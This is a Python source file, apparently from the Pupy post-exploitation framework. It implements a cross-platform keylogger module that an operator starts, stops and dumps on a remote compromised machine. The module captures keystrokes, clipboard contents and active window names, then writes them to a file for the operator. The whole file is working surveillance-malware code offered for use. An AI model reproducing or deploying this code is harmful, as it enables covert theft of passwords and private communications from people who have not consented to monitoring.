# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupy.network.lib.convcompat import as_unicode_string

from io import open

KEYLOGGER_EVENT = 0x11000001

__class_name__ = 'KeyloggerModule'
__events__ = {
    KEYLOGGER_EVENT: 'keylogger'
}


@config(cat="gather", compat=["linux", "darwin", "windows"])
class KeyloggerModule(PupyModule):
    """
        A keylogger to monitor all keyboards interaction including the clipboard :-)
        The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
    """

    unique_instance = True
    dependencies = {
        'windows': ['pupwinutils.keylogger', 'pupwinutils.hookfuncs'],
        'linux': ['keylogger'],
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='keylogger', description=cls.__doc__)
        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def stop_daemon(self):
        self.success("keylogger stopped")

    def run(self, args):

        if args.action=="start":
            if self.client.is_windows():
                keylogger_start = self.client.remote('pupwinutils.keylogger', 'keylogger_start', False)
                if not keylogger_start(KEYLOGGER_EVENT):
                    self.error("the keylogger is already started")
                else:
                    self.success("keylogger started !")

            elif self.client.is_linux():
                keylogger_start = self.client.remote('keylogger', 'keylogger_start', False)

                r = keylogger_start(KEYLOGGER_EVENT)
                if r == 'no_x11':
                    self.error("the keylogger does not work without x11 graphical interface")
                elif not r:
                    self.error("the keylogger is already started")
                else:
                    self.success("keylogger started !")

            # for Mac OS
            elif self.client.is_darwin():
                keylogger_start = self.client.remote('keylogger', 'keylogger_start', False)

                r = keylogger_start(KEYLOGGER_EVENT)
                if r == 'running':
                    self.error("the keylogger is already started")
                elif not r:
                    self.error("the keylogger cannot be launched")
                else:
                    self.success("keylogger started !")

        elif args.action=="dump":
            if self.client.is_windows():
                keylogger_dump = self.client.remote('pupwinutils.keylogger', 'keylogger_dump')
            else:
                keylogger_dump = self.client.remote('keylogger', 'keylogger_dump')

            data = keylogger_dump()

            if data is None:
                self.error("keylogger not started")

            elif not data:
                self.warning("no keystrokes recorded")

            else:
                filepath = self.config.get_file('keystrokes', {'%c': self.client.short_name()})

                self.success("dumping recorded keystrokes in %s"%filepath)
                self.log(data)

                with open(filepath, 'w') as f:
                    f.write(as_unicode_string(data))

        elif args.action=="stop":
            if self.client.is_windows():
                keylogger_stop = self.client.remote('pupwinutils.keylogger', 'keylogger_stop')
            else:
                keylogger_stop = self.client.remote('keylogger', 'keylogger_stop')

            data = keylogger_stop()

            if data:
                self.log(data)

            self.success("keylogger stopped")
